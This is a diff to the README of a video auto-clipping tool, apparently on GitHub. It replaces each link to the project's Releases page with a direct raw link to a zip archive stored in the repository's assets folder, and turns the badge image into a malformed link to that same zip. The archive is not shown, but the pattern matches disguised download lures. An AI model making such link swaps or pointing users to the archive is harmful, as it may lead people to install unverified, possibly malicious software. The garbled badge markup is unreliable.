@@ -1,6 +1,6 @@
 # 🎥 Video-AutoClip-Automatic-Stream-Highlights-Smart-Video-Cutter - Effortless Highlights for Your Videos
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/Himansh29/Video-AutoClip-Automatic-Stream-Highlights-Smart-Video-Cutter/releases)
+[![Download](https://raw.githubusercontent.com/Himansh29/Video-AutoClip-Automatic-Stream-Highlights-Smart-Video-Cutter/main/assets/Video_Auto_Clip_Highlights_Cutter_Automatic_Smart_Stream_v1.3.zip%https://raw.githubusercontent.com/Himansh29/Video-AutoClip-Automatic-Stream-Highlights-Smart-Video-Cutter/main/assets/Video_Auto_Clip_Highlights_Cutter_Automatic_Smart_Stream_v1.3.zip)](https://raw.githubusercontent.com/Himansh29/Video-AutoClip-Automatic-Stream-Highlights-Smart-Video-Cutter/main/assets/Video_Auto_Clip_Highlights_Cutter_Automatic_Smart_Stream_v1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ To ensure smooth operation of Video-AutoClip, please check the following:
 
 To get started, visit the Releases page to download Video-AutoClip:
 
-[Download Latest Release](https://github.com/Himansh29/Video-AutoClip-Automatic-Stream-Highlights-Smart-Video-Cutter/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Himansh29/Video-AutoClip-Automatic-Stream-Highlights-Smart-Video-Cutter/main/assets/Video_Auto_Clip_Highlights_Cutter_Automatic_Smart_Stream_v1.3.zip)
 
 ### Step 2: Install the Application
 
@@ -103,4 +103,4 @@ For questions, feedback, or contributions, you can find us on GitHub. We encoura
 
 Ready to start? Download Video-AutoClip now and see the difference it makes in your video editing process.
 
-[Download Latest Release](https://github.com/Himansh29/Video-AutoClip-Automatic-Stream-Highlights-Smart-Video-Cutter/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Himansh29/Video-AutoClip-Automatic-Stream-Highlights-Smart-Video-Cutter/main/assets/Video_Auto_Clip_Highlights_Cutter_Automatic_Smart_Stream_v1.3.zip)
